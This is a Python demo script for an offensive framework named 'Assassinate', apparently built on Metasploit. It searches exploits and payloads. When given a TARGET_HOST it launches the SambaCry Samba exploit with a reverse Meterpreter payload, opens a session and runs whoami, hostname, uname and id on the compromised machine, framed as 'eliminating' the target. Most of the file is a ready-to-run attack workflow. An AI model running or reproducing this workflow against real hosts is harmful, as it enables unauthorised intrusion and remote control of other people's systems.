"""Demo workflow for the Assassinate framework.

This module demonstrates the high-level Assassinate API with Arsenal,
Contracts, and the full workflow from weapon discovery to execution.

Usage:
    # Via CLI
    assassinate demo

    # With a target for exploitation
    TARGET_HOST=192.168.1.100 assassinate demo

Environment Variables:
    TARGET_HOST: IP address of target to exploit (optional)
"""

from __future__ import annotations

import os
import sys

from assassinate import Hideout, Target, Contract
from assassinate.console import (
    console, print_section, print_status, print_kv, print_list, print_banner,
)


def demo_arsenal(hideout: Hideout) -> None:
    """Demonstrate arsenal search and discovery capabilities."""
    print_section("ARSENAL DEMONSTRATION")

    # Show arsenal statistics
    console.print("[bold]Arsenal Statistics:[/bold]")
    stats = hideout.arsenal.stats()
    print_list([(t.capitalize(), str(c)) for t, c in sorted(stats.items())])
    console.print()

    # Demonstrate new catalog-based filtering
    console.print("[bold]Catalog-Based Filtering (New API):[/bold]")

    # Filter weapons using catalog
    console.print("\n  [cyan][1][/cyan] SMB exploits with good+ rank (catalog filter)...")
    smb_exploits = hideout.arsenal.weapons.filter(
        type="exploit",
        service="smb",
        min_rank="good"
    ).sorted_by_rank().limit(5)

    for info in smb_exploits:
        console.print(f"      [dim]•[/dim] {info.name} ([green]{info.rank}[/green]) - {info.description[:50]}...")

    # Chain filters
    console.print("\n  [cyan][2][/cyan] Linux exploits (chained filters)...")
    linux = hideout.arsenal.weapons.exploits().by_platform("linux").limit(5)
    for info in linux:
        platforms = ", ".join(info.platforms) if info.platforms else "any"
        console.print(f"      [dim]•[/dim] {info.name} - [yellow]{platforms}[/yellow]")

    # Filter bullets
    console.print("\n  [cyan][3][/cyan] Meterpreter reverse bullets for Linux...")
    bullets = hideout.arsenal.bullets.meterpreter().reverse().for_platform("linux").limit(5)
    for b in bullets:
        console.print(f"      [dim]•[/dim] [magenta]{b.name}[/magenta]")
        console.print(f"        Type: {b.type}, Arch: {b.arch}")

    # Legacy search still works
    console.print("\n  [cyan][4][/cyan] Legacy search: 'samba' exploits...")
    weapons = hideout.arsenal.find("samba", type="exploit", limit=3)
    for w in weapons:
        console.print(f"      [dim]•[/dim] {w.name} ([green]{w.rank}[/green]) - {w.short_description}")

    console.print()


def demo_weapon_details(hideout: Hideout) -> None:
    """Demonstrate weapon inspection capabilities."""
    print_section("WEAPON INSPECTION")

    # Get weapon from catalog entry
    console.print("[bold]Getting weapon from catalog entry:[/bold]")
    samba_weapons = hideout.arsenal.weapons.search("is_known_pipename").limit(1)
    if samba_weapons:
        info = samba_weapons.first()
        print_status(f"Found: [cyan]{info.fullname}[/cyan]", "success")
        print_kv("Rank", info.rank, "green")
        print_kv("Service", info.service or "N/A")
        print_kv("Port", str(info.port) if info.port else "N/A")

        # Get full weapon object
        weapon = info.weapon()
        console.print()
        console.print(weapon.describe())
    else:
        # Fallback to direct get
        weapon = hideout.arsenal.get("exploit/linux/samba/is_known_pipename")
        console.print(weapon.describe())

    # Show compatible bullets
    console.print("\n[bold]Compatible Bullets (top 5):[/bold]")
    bullets = weapon.bullets()[:5]
    for b in bullets:
        console.print(f"  [dim]•[/dim] [magenta]{b.name}[/magenta]")
        console.print(f"    Type: {b.type}, Arch: {b.arch}, Connection: {b.connection}")

    # Load best bullet
    best = weapon.best_bullet()
    if best:
        weapon.load(best)
        print_status(f"Loaded: [yellow]{weapon.loaded.name}[/yellow]", "success")

    console.print()


def demo_contract_workflow(hideout: Hideout, target_host: str) -> None:
    """Demonstrate the full contract workflow with a real target."""
    print_section("CONTRACT WORKFLOW")

    # Create target
    target = Target(target_host)
    console.print(f"[bold]Target:[/bold] [cyan]{target.host}[/cyan]")

    # Find weapon
    console.print("\n[bold]Searching for SambaCry exploit...[/bold]")
    weapons = hideout.arsenal.find("is_known_pipename", type="exploit")
    if not weapons:
        print_status("Weapon not found!", "error")
        return

    weapon = weapons[0]
    print_status(f"Found: [cyan]{weapon.fullname}[/cyan]", "success")

    # Create contract
    console.print("\n[bold]Creating contract...[/bold]")
    contract = hideout.contract(target, weapon)
    contract.configure(SMB_SHARE_NAME="myshare")
    print_kv("Weapon", contract.weapon.name)
    print_kv("Bullet", contract.bullet.name, "yellow")
    print_kv("Target", contract.target.host)

    # Validate
    issues = contract.validate()
    if issues:
        print_status("Validation issues:", "warning")
        for issue in issues:
            console.print(f"      [dim]-[/dim] {issue}")

    # Profile target
    console.print("\n[bold]Profiling target...[/bold]")
    if contract.profile(timeout=3.0):
        print_status("Target appears vulnerable!", "success")
        print_status(f"Open ports: {sorted(target.ports)}", "success")

        # Execute
        console.print("\n[bold red]Executing contract...[/bold red]")
        kill = contract.execute(timeout=60)

        if kill:
            console.print("\n  [bold green]TARGET ELIMINATED![/bold green]")
            print_kv("Session", f"{kill.id} ({kill.type})", "green")
            print_kv("Host", f"{kill.host}:{kill.port}")

            # Interrogate
            console.print("\n[bold]Interrogating target...[/bold]")
            whoami = kill.interrogate("whoami").strip()
            print_kv("whoami", whoami, "green")

            hostname = kill.interrogate("hostname").strip()
            print_kv("hostname", hostname)

            uname = kill.interrogate("uname -a").strip()
            print_kv("uname", uname)

            # Clean up
            console.print("\n[bold]Cleaning up...[/bold]")
            kill.silence()
            print_status("Session terminated", "success")
        else:
            print_status("Exploitation failed - no session established", "error")
    else:
        print_status("Target not vulnerable or port closed", "error")

    console.print()


def demo_quick_hit(hideout: Hideout, target_host: str) -> None:
    """Demonstrate the quick_hit one-liner method."""
    print_section("QUICK HIT (ONE-LINER)")

    console.print(f"[bold]Target:[/bold] [cyan]{target_host}[/cyan]")
    console.print("   Using [cyan]hideout.quick_hit()[/cyan] for instant exploitation...")
    console.print()

    kill = hideout.quick_hit(
        target=target_host,
        weapon="exploit/linux/samba/is_known_pipename",
        SMB_SHARE_NAME="myshare",
        timeout=60,
    )

    if kill:
        print_status(f"SUCCESS! Kill #{kill.id}", "success")
        console.print(f"   [green]{kill.interrogate('id').strip()}[/green]")
        kill.silence()
    else:
        print_status("Exploitation failed", "error")

    console.print()


def main() -> None:
    """Initialize hideout and demonstrate framework capabilities."""
    # Check for target host
    target_host = os.environ.get("TARGET_HOST")

    print_banner()
    console.print("[dim]High-Level Python Framework for Precision Exploitation[/dim]")
    console.print()

    # Establish the hideout
    with Hideout() as hideout:
        print_status(f"Hideout established - Framework v{hideout.version}", "success")
        console.print()

        # Always run demos
        demo_arsenal(hideout)
        demo_weapon_details(hideout)

        # If target specified, run exploitation
        if target_host:
            console.print()
            print_status("TARGET_HOST detected - proceeding with exploitation...", "info")
            console.print()
            demo_contract_workflow(hideout, target_host)
        else:
            console.print()
            console.print("[bold yellow]Set TARGET_HOST environment variable to run exploitation demo:[/bold yellow]")
            console.print("   [cyan]TARGET_HOST=192.168.1.100 assassinate demo[/cyan]")
            console.print()

        # Show current kills
        kills = hideout.kills()
        if kills:
            console.print(f"[bold red]Active kills:[/bold red] {len(kills)}")
            for kill in kills:
                console.print(f"   [dim]•[/dim] {kill}")
        else:
            console.print("[dim]No active kills[/dim]")
        console.print()

        print_status("Mission briefing complete", "success")


if __name__ == "__main__":
    main()
